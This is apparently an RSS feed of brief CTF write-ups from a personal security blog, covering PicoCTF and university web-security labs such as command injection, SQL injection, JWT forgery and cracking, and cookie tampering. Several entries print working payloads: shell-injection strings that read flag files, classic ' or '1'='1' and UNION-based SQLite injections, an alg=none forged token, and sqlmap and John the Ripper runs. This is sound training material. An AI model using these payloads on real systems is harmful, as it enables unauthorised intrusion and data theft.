解題流程與思路 這一題很簡單，只要觀察送出的封包就可以知道每一個品項都是按照順序的(可預期的號碼)，所以只要把品項改成我們要的就可以成功query，如下圖，原本FLAG的column反白無法點選 但因為送出的item number可預期，所以還是能夠正常query 接著看下一個packet就知道連我們的餘額以及支付金額都是裸奔的狀態，所以可以直接更改拿到flag Lab-DNS Lookuper Flag: FLAG{Y0U_$(Byp4ssed)_th3_`waf`}
解題流程與思路 Use $ or ` string to bypass blacklist Payload: '$(cat /fla*)' 'cat /fl*g*'</description></item><item><title>PicoCTF - caas</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---caas/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---caas/index.html</guid><description>PicoCTF - caas tags: PicoCTF CTF Web Background Command Injection
Source code const express = require('express'); const app = express(); const { exec } = require('child_process'); app.use(express.static('public')); app.get('/cowsay/:message', (req, res) => { exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => { if (error) return res.status(500).end(); res.type('txt').send(stdout).end(); }); }); app.listen(3000, () => { console.log('listening'); }); Recon 直覺是command injection
Exploit - Easy Command Injection Payload: /cowsay/123;ls;cat falg.txt Flag: picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
Reference CaaS | Web Category | PicoCTF | CTF For beginners</description></item><item><title>PicoCTF - Cookies</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---cookies/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---cookies/index.html</guid><description>PicoCTF - Cookies tags: PicoCTF CTF Web Challenge: http://mercury.picoctf.net:64944/
Background curl 的用法指南
-H參數添加 HTTP 請求的標頭。 $ curl -H 'Accept-Language: en-US' https://google.com
-s參數將不輸出錯誤和進度信息。 $ curl -s https://www.example.com
-L參數會讓 HTTP 請求跟隨服務器的重定向。curl 默認不跟隨重定向。 $ curl -L -d 'tweet=hi' https://api.twitter.com/tweet
-I參數向服務器發出 HEAD 請求，然會將服務器返回的 HTTP 標頭打印出來。 $ curl -I https://www.example.com
Exploit Try to analyze When I input something, it’ll redirect to another page I tried to change cookie to different number and also modify the different value of name parameter however, still got wrong information.</description></item><item><title>PicoCTF - dont-use-client-side</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---dont-use-client-side/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---dont-use-client-side/index.html</guid><description>PicoCTF - dont-use-client-side tags: PicoCTF CTF Web Challenge: dont-use-client-side
Exploit - Page source code picoCTF{no_clients_plz_b706c5}</description></item><item><title>PicoCTF - Insp3ct0r</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---insp3ct0r/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---insp3ct0r/index.html</guid><description>PicoCTF - Insp3ct0r tags: PicoCTF CTF Web Challenge: Insp3ct0r
Source code Exploit - Browser Inspector HTML
&lt;!doctype html> &lt;html> &lt;head> &lt;title>My First Website :)&lt;/title> &lt;link href="https://fonts.googleapis.com/css?family=Open+Sans|Roboto" rel="stylesheet"> &lt;link rel="stylesheet" type="text/css" href="mycss.css"> &lt;script type="application/javascript" src="myjs.js">&lt;/script> &lt;/head> &lt;body> &lt;div class="container"> &lt;header> &lt;h1>Inspect Me&lt;/h1> &lt;/header> &lt;button class="tablink" onclick="openTab('tabintro', this, '#222')" id="defaultOpen">What&lt;/button> &lt;button class="tablink" onclick="openTab('tababout', this, '#222')">How&lt;/button> &lt;div id="tabintro" class="tabcontent"> &lt;h3>What&lt;/h3> &lt;p>I made a website&lt;/p> &lt;/div> &lt;div id="tababout" class="tabcontent"> &lt;h3>How&lt;/h3> &lt;p>I used these to make this site: &lt;br/> HTML &lt;br/> CSS &lt;br/> JS (JavaScript) &lt;/p> &lt;!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 --> &lt;/div> &lt;/div> &lt;/body> &lt;/html> CSS Download it and search specific string</description></item><item><title>PicoCTF - It is my Birthday</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---it-is-my-birthday/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---it-is-my-birthday/index.html</guid><description>PicoCTF - It is my Birthday tags: PicoCTF CTF Web Challenge: It is my Birthday
Background corkami/collisions
Exploit - MD5 Collision Try to find different pdf file that has same MD5 hash Such as the example provided by corkami - poeMD5_A and poeMD5_B Note that, you must notice the file size you uploaded can not too large.
Source code - After Exploit :::spoiler after exploit you can get the source code &amp; flag</description></item><item><title>PicoCTF - JAUTH</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jauth/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jauth/index.html</guid><description>PicoCTF - JAUTH Background NTUCNS - HW3 - JWT Authentication
Exploit - JWR + None 其實這一題有一點奇怪，應該說之前在解CNS作業的驗證時，TA說目前應該是不行以Alg=None的形式進行驗證的設計，我以為是後端的框架都不支援了，但應該說是不建議這樣的做法，所以這一題比想像中簡單，我還以為要把公鑰找出來，再進行sign
用類似jwt.io的網站(online tool)，但支援alg=none的編碼 Payload: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg3NzY0MjM1MTAzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwOS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzExNC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjg3NzY0MjM1fQ Flag: picoCTF{succ3ss_@u7h3nt1c@710n_72bf8bd5}
Reference picoCTF : JAUTH (Challenge 8)</description></item><item><title>PicoCTF - Java Code Analysis!?!</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-code-analysis_/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-code-analysis_/index.html</guid><description>PicoCTF - Java Code Analysis!?! Background JWT
Source code Too Much to list
Hint Maybe try to find the JWT Signing Key (“secret key”) in the source code? Maybe it’s hardcoded somewhere? Or maybe try to crack it? The ‘role’ and ‘userId’ fields in the JWT can be of interest to you! The ‘controllers’, ‘services’ and ‘security’ java packages in the given source code might need your attention. We’ve provided a README.md file that contains some documentation. Upgrade your ‘role’ with the new (cracked) JWT. And re-login for the new role to get reflected in browser’s localStorage. Recon 這一題在AIS3 pre-exam的時候也有看到，但當時根本沒想法，只要題目看起來一複雜我就沒辦法分析了，所以還是看了Martin大的WP才知道解法，但有時候真的很考驗耐心，先看hint發現應該是考跟JWT有關</description></item><item><title>PicoCTF - Java Script Kiddie</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-script-kiddie/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---java-script-kiddie/index.html</guid><description>PicoCTF - Java Script Kiddie Background JavaScript Array slice()
const fruits = ["Banana", "Orange", "Lemon", "Apple", "Mango"]; const citrus = fruits.slice(1, 3); # output: Orange,Lemon JavaScript Uint8Array.from() Method
let array = Uint8Array.from('45465768654323456'); console.log(array); # output: Uint8Array(17) [ 4, 5, 4, 6, 5, 7, 6, 8, 6, 5, 4, 3, 2, 3, 4, 5, 6 ] JavaScript String.fromCharCode()
let text = String.fromCharCode(65); console.log(text) # output: A Source code :::spoiler Source Code
&lt;html> &lt;head> &lt;script src="jquery-3.3.1.min.js">&lt;/script> &lt;script> var bytes = []; $.get("bytes", function(resp) { bytes = Array.from(resp.split(" "), x => Number(x)); }); function assemble_png(u_in){ var LEN = 16; var key = "0000000000000000"; var shifter; if(u_in.length == LEN){ key = u_in; } var result = []; for(var i = 0; i &lt; LEN; i++){ shifter = key.charCodeAt(i) - 48; for(var j = 0; j &lt; (bytes.length / LEN); j ++){ result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i] } } while(result[result.length-1] == 0){ result = result.slice(0,result.length-1); } document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result))); return false; } &lt;/script> &lt;/head> &lt;body> &lt;center> &lt;form action="#" onsubmit="assemble_png(document.getElementById('user_in').value)"> &lt;input type="text" id="user_in"> &lt;input type="submit" value="Submit"> &lt;/form> &lt;img id="Area" src=""/> &lt;/center> &lt;/body> &lt;/html> :::</description></item><item><title>PicoCTF - JaWT Scratchpad</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jawt-scratchpad/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---jawt-scratchpad/index.html</guid><description>PicoCTF - JaWT Scratchpad Background NTUCNS - HW3 - JWT Authentication
Recon 這一題蠻有趣的，有結合其他東西當作解題的基礎，先看JWT的token，decode過後的結果表示： 也就是說，token只會隨著payload而變動，所以也沒有辦法用解public key的方式重新簽署文件，另外用alg=none也會出現Authentication failed，不過作者有在網頁中有給出提示，用John，看起來就是用john-the-ripper解出token password
Exploit - Brute Force Brute Force Password
$ cat jwt.txt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaGhoIn0.j1yd-PJbjNraLhhBAxZBD2C1EVIyHqlnvKh_l-iVKG8% $ ./john.exe ../jwt.txt --wordlist=../rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status ilovepico (?) 1g 0:00:00:02 DONE (2023-06-26 18:42) 0.3673g/s 2720Kp/s 2720Kc/s 2720KC/s ilovetitoelbambino..ilovejesus71 Use the "--show" option to display all of the cracked passwords reliably Session completed Token Password: ilovepico</description></item><item><title>PicoCTF - More SQLi</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---more-sqli/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---more-sqli/index.html</guid><description>PicoCTF - More SQLi Background Feifei Lab Hint SQLiLite Recon 先隨便輸入發現他很貼心有給完整的payload，發現他是先檢查password，在沒有任何防護的情況下，直接用最經典的payload就可了 Account: Any Password: ' or '1'='1' -- # Exploit - SQLi(Union Selection) 現在的目標是flag應該是藏在別的table，所以先找甚麼table
找table 透過Kaibro的cheat sheet，SQLite的爆破payload是SELECT name FROM sqlite_master WHERE type='table'，而目前我們可以用union based的方式搜尋，先觀察搜尋Algiers的搜尋column有三個，第一個column是chr，第二個column是chr，第三個是int，所以在用union select的時候要遵守查詢數量一樣、每個欄位的型態一樣 Payload: Algiers' union SELECT sql,sql,1 FROM sqlite_master WHERE type='table'; -- :::spoiler Screenshot :::</description></item><item><title>PicoCTF - Most Cookies</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---most-cookies/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---most-cookies/index.html</guid><description>PicoCTF - Most Cookies tags: PicoCTF CTF Web Background Python Flask session 學習心得
在Flask將資料儲存在session這個object裡面時，可看成是儲存在client端，因為資料其實是存在web server，每次新增內容到session就會新增一個新的cookie(cryptographically-signed cookies)，並透過secret_key做簽章。需注意的是這所謂的「secret_key」並不是用於加密(切勿儲存機密資料)，而是用來做數位簽章確認資料的完整性，簡單說是每個人都可以知道cookie裡面的資料，但只有server知道cookie是否被串改，如果被串改就無法登入該帳戶。
Source code :::spoiler Source Code
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session import random app = Flask(__name__) flag_value = open("./flag").read().rstrip() title = "Most Cookies" cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"] app.secret_key = random.choice(cookie_names) @app.route("/") def main(): if session.get("very_auth"): check = session["very_auth"] if check == "blank": return render_template("index.html", title=title) else: return make_response(redirect("/display")) else: resp = make_response(redirect("/")) session["very_auth"] = "blank" return resp @app.route("/search", methods=["GET", "POST"]) def search(): if "name" in request.form and request.form["name"] in cookie_names: resp = make_response(redirect("/display")) session["very_auth"] = request.form["name"] return resp else: message = "That doesn't appear to be a valid cookie." category = "danger" flash(message, category) resp = make_response(redirect("/")) session["very_auth"] = "blank" return resp @app.route("/reset") def reset(): resp = make_response(redirect("/")) session.pop("very_auth", None) return resp @app.route("/display", methods=["GET"]) def flag(): if session.get("very_auth"): check = session["very_auth"] if check == "admin": resp = make_response(render_template("flag.html", value=flag_value, title=title)) return resp flash("That is a cookie! Not very special though...", "success") return render_template("not-flag.html", title=title, cookie_name=session["very_auth"]) else: resp = make_response(redirect("/")) session["very_auth"] = "blank" return resp if __name__ == "__main__": app.run() :::</description></item><item><title>PicoCTF - notepad</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---notepad/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---notepad/index.html</guid><description>PicoCTF - notepad Background Flask實作_基礎_03_簡述url_for與route werkzeug.url_fix
Source code Recon Exploit Reference</description></item><item><title>PicoCTF - Scavenger Hunt</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---scavenger-hunt/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---scavenger-hunt/index.html</guid><description>PicoCTF - Scavenger Hunt tags: PicoCTF CTF Web Challenge: Scavenger Hunt
Background .htaccess 使用技巧彙整
.htaccess文件(或者」分佈式配置文件」）提供了針對目錄改變配置的方法， 即，在一個特定的文件目錄中放置一個包含一個或多個指令的文件， 以作用於此目錄及其所有子目錄。作為用戶，所能使用的命令受到限制。管理員可以通過Apache的AllowOverride指令來設置。 概述來說，htaccess文件是Apache伺服器中的一個配置文件，它負責相關目錄下的網頁配置。通過htaccess文件，可以幫我們實現：網頁301重定向、自定義404錯誤頁面、改變文件擴展名、允許/阻止特定的用戶或者目錄的訪問、禁止目錄列表、配置預設文件等功能。 .htaccess 詳解
Exploit - Insp3ct0r + htaccess + DS_Store HTML + CSS +JS These files keeps one fragment flag each. Especially js file’s hint: /* How can I keep Google from indexing my website? */ Apache server $\to$ .htaccess file</description></item><item><title>PicoCTF - Secrets</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---secrets/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---secrets/index.html</guid><description>PicoCTF - Secrets tags: PicoCTF CTF Web Recon Description: We have several pages hidden. Can you find the one with the flag? Hint: folders folders folders 這一題也是蠻有趣的
Exploit - 通靈 首先看一下網頁的source code，沒什麼特別的地方，但有看到secret/assets/index.css，所以有一個route是secrets，試看看有甚麼東西 發現這樣的想法是對的，陸續看一下source code有甚麼其他route，就繼續加在URL就對了 Payload: view-source:http://saturn.picoctf.net:65352/secret/hidden/superhidden/ Flag: picoCTF{succ3ss_@h3n1c@10n_790d2615}
Reference secrets | picoCTF 2022</description></item><item><title>PicoCTF - Some Assembly Required 1</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-1/index.html</guid><description>PicoCTF - Some Assembly Required 1 tags: PicoCTF CTF Web Challenge: Some Assembly Required 1
Background 了解 WebAssembly 的基礎使用方法
Source code - After Beautify :::spoiler source code
const strings = ['value', '2wfTpTR', 'instantiate', '275341bEPcme', 'innerHTML', '1195047NznhZg', '1qfevql', 'input', '1699808QuoWhA', 'Correct!', 'check_flag', 'Incorrect!', './JIFxzHyW8W', '23SMpAuA', '802698XOMSrr', 'charCodeAt', '474547vVoGDO', 'getElementById', 'instance', 'copy_char', '43591XxcWUl', '504454llVtzW', 'arrayBuffer', '2NIQmVj', 'result']; const search_string1 = function(id1, _0x53c021) { id1 = id1 - 470; let strings6f = strings[id1]; return strings6f; }; (function(id1, id2) { const search_string = search_string1; while (!![]) { try { const secret_key = -parseInt(search_string(0x1eb)) + parseInt(search_string(0x1ed)) + -parseInt(search_string(0x1db)) * -parseInt(search_string(0x1d9)) + -parseInt(search_string(0x1e2)) * -parseInt(search_string(0x1e3)) + -parseInt(search_string(0x1de)) * parseInt(search_string(0x1e0)) + parseInt(search_string(0x1d8)) * parseInt(search_string(0x1ea)) + -parseInt(search_string(0x1e5)); if (secret_key === id2) break; else id1['push'](id1['shift']()); } catch (_0x41d31a) { id1['push'](id1['shift']()); } } }(strings, 627907)); let exports; (async () => { const search_string = search_string1; let _0x5f0229 = await fetch(search_string(489)), _0x1d99e9 = await WebAssembly[search_string(479)](await _0x5f0229[search_string(474)]()), _0x1f8628 = _0x1d99e9[search_string(470)]; exports = _0x1f8628['exports']; })(); function onButtonPress() { const search_string = search_string1; let input_value = document['getElementById'](search_string(484))[search_string(477)]; // document['getElementById'](input)[value] for (let i = 0; i &lt; input_value['length']; i++) { exports[search_string(471)](input_value[search_string(492)](i), i); } exports['copy_char'](0, input_value['length']), exports[search_string(487)]() == 1 ? document[search_string(494)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e6) : document[search_string(0x1ee)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e8); } :::</description></item><item><title>PicoCTF - Some Assembly Required 2</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-2/index.html</guid><description>PicoCTF - Some Assembly Required 2 tags: PicoCTF CTF Web Background Source code :::spoiler source
const list_str = ['copy_char', 'value', '207aLjBod', '1301420SaUSqf', '233ZRpipt', '2224QffgXU', 'check_flag', '408533hsoVYx', 'instance', '278338GVFUrH', 'Correct!', '549933ZVjkwI', 'innerHTML', 'charCodeAt', './aD8SvhyVkb', 'result', '977AzKzwq', 'Incorrect!', 'exports', 'length', 'getElementById', '1jIrMBu', 'input', '615361geljRK']; const func1_cal = function(var_a, var_b) { var_a = var_a - 195; let list_strc4 = list_str[var_a]; return list_strc4; }; (function(var_a, var_b) { const func1_cal = func1_cal; while (!![]) { try { const var_c = -parseInt(func1_cal(200)) * -parseInt(func1_cal(201)) + -parseInt(func1_cal(205)) + parseInt(func1_cal(207)) + parseInt(func1_cal(195)) + -parseInt(func1_cal(198)) * parseInt(func1_cal(212)) + parseInt(func1_cal(203)) + -parseInt(func1_cal(217)) * parseInt(func1_cal(199)); if (var_c === var_b) break; else var_a['push'](var_a['shift']()); } catch (_0x4f8a) { var_a['push'](var_a['shift']()); } } }(list_str, 310022)); let exports; (async () => { const func1_cal = func1_cal; let res_1 = await fetch(func1_cal(210)), res_2 = await WebAssembly['instantiate'](await res_1['arrayBuffer']()), res_3 = res_2[func1_cal(204)]; exports = res_3[func1_cal(214)]; })(); function onButtonPress() { const func1_cal = func1_cal; let res_1 = document[func1_cal(216)](func1_cal(218))[func1_cal(197)]; for (let idx = 0; idx &lt; res_1['length']; idx++) { exports[func1_cal(196)](res_1[func1_cal(209)](idx), idx); } exports['copy_char'](0, res_1[func1_cal(215)]), exports[func1_cal(202)]() == 1 ? document['getElementById'](func1_cal(211))[func1_cal(208)] = func1_cal(206) : document[func1_cal(216)](func1_cal(211))['innerHTML'] = func1_cal(213); } :::</description></item><item><title>PicoCTF - Some Assembly Required 3</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-3/index.html</guid><description>PicoCTF - Some Assembly Required 3 Background WebAssembly/wabt
$ ./build/wasm2c qCCYI0ajpD.wasm -o dump.c Source code :::spoiler rTEuOmSfG3.js
'use strict'; const str_list = ["exports", "270328ewawLo", "instantiate", "1OsuamQ", "Incorrect!", "length", "copy_char", "value", "1512517ESezaM", "innerHTML", "check_flag", "result", "1383842SQRPPf", "924408cukzgO", "getElementById", "418508cLDohp", "input", "Correct!", "573XsMMHp", "arrayBuffer", "183RUQBDE", "38934oMACea"]; const tranfer_fn = function(url, whensCollection) { /** @type {number} */ url = url - 285; let _0x143f7d = str_list[url]; return _0x143f7d; }; (function(data, oldPassword) { const tranfer_fn = tranfer_fn; for (; !![];) { try { const userPsd = -parseInt("length") + -parseInt("573XsMMHp") + -parseInt("innerHTML") * -parseInt("getElementById") + -parseInt("38934oMACea") + parseInt("value") + -parseInt("Incorrect!") * -parseInt("instantiate") + parseInt("arrayBuffer"); if (userPsd === oldPassword) { break; } else { data["push"](data["shift"]()); } } catch (_0x289152) { data["push"](data["shift"]()); } } })(str_list, 970828); let exports; (async() => { const tranfer_fn = tranfer_fn; let rpm_traffic = await fetch("./qCCYI0ajpD"); let m = await WebAssembly["1512517ESezaM"](await rpm_traffic["1OsuamQ"]()); let updatedEdgesById = m["instance"]; exports = updatedEdgesById["copy_char"]; })(); /** * @return {undefined} */ function onButtonPress() { const tranfer_fn = tranfer_fn; let data = document["183RUQBDE"]("exports")["924408cukzgO"]; for (let i = 0; i &lt; data["result"]; i++) { exports["1383842SQRPPf"](data["charCodeAt"](i), i); } exports["1383842SQRPPf"](0, data["result"]); if (exports["input"]() == 1) { document["183RUQBDE"]("Correct!")["418508cLDohp"] = "270328ewawLo"; } else { document["183RUQBDE"]("Correct!")["innerHTML"] = "check_flag"; } } ; :::</description></item><item><title>PicoCTF - SQLiLite</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---sqlilite/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---sqlilite/index.html</guid><description>PicoCTF - SQLiLite tags: PicoCTF CTF Web Challenge: http://saturn.picoctf.net:55837/
Exploit - sqli Payload: admin' or '1'='1' -- #</description></item><item><title>PicoCTF - Super Serial</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---super-serial/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---super-serial/index.html</guid><description>PicoCTF - Super Serial tags: PicoCTF CTF Web Background php unserialization
Hint The flag is at ../flag Recon 這一題設了太多套路了，但從題目的Title可以猜到應該要用不安全的反序列化
robot.txt 一開始會從這邊開始著手就是因為假的source code啥都沒有，本來也以為是sqli，但也沒收穫，看了WP才知道要從這邊開始，可以看到以下訊息，但副檔名居然不是一般的php而是phps(而且/admin.phps沒有任何東西)，可見php是個幌子，則前面的source code就要重新分析 index.phps 用index.phps查看source code發現有一些其他怪東西，包括authentication.phps和cookie.php :::spoiler Real Source Code
&lt;?php require_once("cookie.php"); if(isset($_POST["user"]) &amp;&amp; isset($_POST["pass"])){ $con = new SQLite3("../users.db"); $username = $_POST["user"]; $password = $_POST["pass"]; $perm_res = new permissions($username, $password); if ($perm_res->is_guest() || $perm_res->is_admin()) { setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/"); header("Location: authentication.php"); die(); } else { $msg = '&lt;h6 class="text-center" style="color:red">Invalid Login.&lt;/h6>'; } } ?> &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"> &lt;link href="style.css" rel="stylesheet"> &lt;script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous">&lt;/script> &lt;/head> &lt;body> &lt;div class="container"> &lt;div class="row"> &lt;div class="col-sm-9 col-md-7 col-lg-5 mx-auto"> &lt;div class="card card-signin my-5"> &lt;div class="card-body"> &lt;h5 class="card-title text-center">Sign In&lt;/h5> &lt;?php if (isset($msg)) echo $msg; ?> &lt;form class="form-signin" action="index.php" method="post"> &lt;div class="form-label-group"> &lt;input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus> &lt;label for="user">Username&lt;/label> &lt;/div> &lt;div class="form-label-group"> &lt;input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required> &lt;label for="pass">Password&lt;/label> &lt;/div> &lt;button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in&lt;/button> &lt;/form> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;/body> &lt;/html> :::</description></item><item><title>PicoCTF - Who are you?</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---who-are-you_/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---who-are-you_/index.html</guid><description>PicoCTF - Who are you? tags: PicoCTF CTF Web Background 【Chrome 85 更新】淺談 Referer-Policy 和更新影響 HTTP Referer 是什麼? 當使用者訪問網站時，會發送請求 (request) 給伺服器主機，而請求 header 中會有一個欄位是「referer」，而此欄位會存放當前請求來源的位置，也就是說請求的來源頁面。
舉個例子：當小明從「iT邦幫忙」網站中點擊連結後，進入「Max 行銷誌」網站時，所發送的 request 請求 referer 就會是 https://ithelp.ithome.com.tw/ 的網址。
RFC 2616 - Date The Date general-header field represents the date and time at which the message was originated, having the same semantics as orig-date in RFC 822. The field value is an HTTP-date, as described in section 3.3.1; it MUST be sent in RFC 1123 [8]-date format.</description></item><item><title>Simple Web - 0x02(Lab - Whois Tool)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/index.html</guid><description>Simple Web - 0x02(Lab - Whois Tool) tags: CTF Web eductf Challenge: https://whoistool.ctf.zoolab.org/
Background Almost the same as 0x10(Lab - DNS Lookup Tool | WAF)
Source Code &lt;?php if(isset($_GET["host"])){ $host = $_GET["host"]; if(strlen($host) > 15) echo "Host name tooooooo logn!!"; else echo `whois "{$host}" 2>&amp;1;`; } ?> Exploit Payload: ";ls -al;" Payload: ";cat flag.t*;" Then we got flag!!!</description></item><item><title>Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/index.html</guid><description>Simple Web - 0x03(Lab - Normal Login Panel (Flag 1)) tags: CTF Web eductf Challenge: https://login.ctf.zoolab.org/
Background Source Code Analysis Exploit - SQLi Easy way - SQLmap $ ./sqlmap.py "https://login.ctf.zoolab.org/" --form -dbs sqlite --dump --risk=3 --level=5 ... --- Parameter: username (POST) Type: time-based blind Title: SQLite > 2.0 AND time-based blind (heavy query) Payload: username='||(SELECT CHAR(116,86,90,89) WHERE 7681=7681 AND 7766=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||'&amp;password= --- Hard way - try&amp;error Check if it has sqli problem Payload: union'</description></item><item><title>Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/index.html</guid><description>Simple Web - 0x04(Lab - Normal Login Panel (Flag 2)) tags: CTF Web eductf Challenge: https://login.ctf.zoolab.org/
Background Web Security 0x1
Source Code :::spoiler code
